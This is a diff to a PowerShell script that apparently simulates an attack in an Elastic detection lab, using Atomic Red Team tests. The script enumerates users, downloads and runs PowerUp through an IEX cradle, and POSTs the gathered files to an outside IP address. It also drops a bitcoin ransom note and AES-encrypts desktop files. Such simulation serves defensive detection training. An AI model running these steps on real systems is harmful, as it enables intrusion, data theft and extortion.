@@ -6,6 +6,9 @@ Write-Host "[+] T1091" -ForegroundColor Green
 Invoke-AtomicTest T1091
 Start-Sleep -S 15
 
+Write-Host "[+] Creating Secret Document" -ForegroundColor Green
+echo "VTBkV2VWcFRRbWhqYlZWbldWZDRjMGxIT1cxSlJ6RTFTVWhDYUdNelRqTmlNMHByWTNsQ2JXSXpTV2RrUjJod1kzbENkRmxYVG05aFZ6VnNUM2R3UWxwSE1YQmlhbkJYWWxaYU5WcFdXazlpUm10NlUyMTRhMUpyU205WmVrNVBUVEpKZWxOdGRHcGtNamc1UTJ0V2MxbFlUakJoVjAwMldsZDRhR016VW5CWmQzQktTVWRvZG1OSFZXZGtSMmhvWkVOQ01HRkhWalZKUjFKMlNVYzFkbVJEUW0xWlYzaHpTVWRzZFVsSVVuWkpTRkp2V2xOQ00yTnRPWFZhZVVKdldWYzFhMk41UldoSlVXODk=" > C:\Users\Elastic\Documents\SecretStuff.txt
+
 Write-Host "[+] Windows Enumeration" -ForegroundColor Green
 net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
@@ -19,9 +22,11 @@ get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\temp\Powerup.txt"
 Start-Sleep -S 15
 
-Write-Host "[+] Exfil" -ForegroundColor Green
-Invoke-AtomicTest T1020
-Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\T1020_exfilFile.txt
+Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
+# Exfil will fail due to IP address
+Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\exfilFile.txt
+$content = Get-Content C:\temp\exfilFile.txt
+Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content
 
 Start-Sleep -S 15
 
@@ -59,7 +64,7 @@ Send $300 worth of bitcoin to this address:
 12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\Elastic\Desktop\RANSOM_NOTE.txt
 
 # Creation of files 
-Write-Host "[+] Creating File" -ForegroundColor Green
+Write-Host "[+] Creating Files" -ForegroundColor Green
 $TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
 $shortcutFile = "C:\Users\Elastic\Desktop\Ransom.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
@@ -695,4 +700,19 @@ Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Rans
 Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom67.lnk
 Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom68.lnk
 Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom69.lnk
+
+Start-Sleep -S 15
+
+Write-Host "[+] Preparing Files" -ForegroundColor Green
+$files = "C:\Users\Elastic\Desktop\Ransom.lnk", "C:\Users\Elastic\Desktop\Ransom1.lnk", "C:\Users\Elastic\Desktop\Ransom2.lnk", "C:\Users\Elastic\Desktop\Ransom3.lnk", "C:\Users\Elastic\Desktop\Ransom4.lnk", "C:\Users\Elastic\Desktop\Ransom6.lnk", "C:\Users\Elastic\Desktop\Ransom7.lnk", "C:\Users\Elastic\Desktop\Ransom8.lnk", "C:\Users\Elastic\Desktop\Ransom9.lnk"
+Compress-Archive -LiteralPath $files -DestinationPath C:\temp\Ransom_Data.zip
+
+Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
+# Exfil will fail due to IP address
+$content1 = Get-Content C:\temp\exfilFile.txt
+Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content1
+
+
+Start-Sleep -S 15
+
 
